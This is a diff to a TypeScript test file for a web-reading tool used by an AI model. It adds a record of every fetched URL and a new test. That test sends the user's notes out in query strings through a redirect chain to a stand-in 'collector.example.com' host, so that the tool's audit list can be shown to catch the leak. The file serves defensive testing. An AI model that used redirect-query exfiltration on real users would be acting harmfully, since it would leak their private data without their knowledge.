@@ -18,7 +18,7 @@ import { createWebImpl, fetchSettings, searchCredits, type WebServer } from './i
 import { PageLoader } from './loader.ts';
 import { WebProblem } from './problem.ts';
 import { PageTabs } from './renderer.ts';
-import { FakeSearch, PUBLIC_DNS, fakeLauncher, html, scriptedFetch, tableLookup } from './testing.ts';
+import { FakeSearch, PUBLIC_DNS, fakeLauncher, html, redirect, scriptedFetch, tableLookup } from './testing.ts';
 import { RunUploads } from './uploads.ts';
 
 const settings = { ...webEnv.parse(), TAVILY_API_KEY: 'tvly-env', WEB_TAVILY_CREDIT: 0.01 };
@@ -162,7 +162,10 @@ describe('web over the link', () => {
       return Promise.resolve({ status: 'done', result: read });
     };
     const result = done(await hub.run('web/read', { url: 'example.com', render: 'always', maxChars: 40 }));
-    expect(result).toEqual({ uri: 'hub://resources/web/article', title: 'An article', finalUrl: 'https://example.com/', text: '# An article\n\nReadable text.', truncated: true, rendered: true });
+    expect(result).toEqual({ uri: 'hub://resources/web/article', title: 'An article', finalUrl: 'https://example.com/', text: '# An article\n\nReadable text.', truncated: true, rendered: true, fetched: ['https://example.com/'] });
+    // the hub's import takes back the page this run fetched, so it goes out once
+    expect(fetchFn.seen.filter((r) => r.url === 'https://example.com/')).toHaveLength(1);
+    expect(server.held.size).toBe(1);
     expect(calls).toEqual([
       { fn: 'hub/resource_import', args: { url: 'https://example.com/', render: 'always' } },
       { fn: 'hub/resource_read', args: { uri: 'hub://resources/web/article', maxChars: 40 } },
@@ -182,7 +185,7 @@ describe('web over the link', () => {
     hub.onCall = (call): Promise<RunSettled> => (call.fn === 'hub/resource_import'
       ? Promise.resolve({ status: 'failed', error: { class: 'caller', message: 'example.com answered 404 Not Found.', code: 'http-status' } })
       : Promise.resolve({ status: 'cancelled' }));
-    expect(await hub.run('web/read', { url: 'https://example.com/missing' })).toMatchObject({ status: 'failed', error: { class: 'caller', code: 'http-status', message: 'example.com answered 404 Not Found.' } });
+    expect(await hub.run('web/read', { url: 'https://example.com/missing' })).toMatchObject({ status: 'failed', error: { class: 'caller', code: 'http-status', message: 'https://example.com/missing answered 404 Not Found.' } });
     hub.onCall = (call): Promise<RunSettled> => (call.fn === 'hub/resource_import'
       ? Promise.resolve({ status: 'done', result: pageRecord('https://example.com/', 'https://example.com/', false) })
       : Promise.resolve({ status: 'cancelled' }));
@@ -205,6 +208,21 @@ describe('web over the link', () => {
     expect(fetchedBack).toMatchObject({ title: 'An article' });
     expect(fetchFn.seen.filter((r) => r.url === 'https://example.com/')).toHaveLength(1);
     expect(server.held.size).toBe(0);
+    // the run says every URL that went out, robots.txt included
+    expect([...z.object({ fetched: z.array(z.string()) }).parse(result).fetched].sort()).toEqual(['https://example.com/', 'https://example.com/robots.txt']);
+  });
+
+  it('says on a read every URL that went out, each redirect and its query included, so a model can’t send data out unseen', async () => {
+    const leak = 'https://collector.example.com/x?d=more-of-the-notes';
+    const table: Record<string, Response> = {
+      'https://example.com/go?d=the-users-notes': redirect(leak),
+      [leak]: redirect('https://www.example.com/landing'),
+      'https://www.example.com/landing': html(ARTICLE),
+    };
+    const lookup = tableLookup({ ...PUBLIC_DNS, 'collector.example.com': ['93.184.215.20'] });
+    const pages = new PageLoader({ registry: createDefaultResourceRegistry(), fetch: (input) => Promise.resolve(table[input] ?? new Response('', { status: 404 })), lookup, renderers: new PageTabs({ launch, concurrency: 1, timeout: 1_000, idle: 0, userAgent: 'test' }), redirects: 5, userAgent: 'test' });
+    const page = await pages.fetch('https://example.com/go?d=the-users-notes', { render: 'never', allowPrivate: false, maxBytes: 100_000, timeout: 1_000 });
+    expect(page.fetched).toEqual(['https://example.com/go?d=the-users-notes', leak, 'https://www.example.com/landing']);
   });
 
   it('refuses something that is not a URL as invalid input, without asking the hub or the network', async () => {
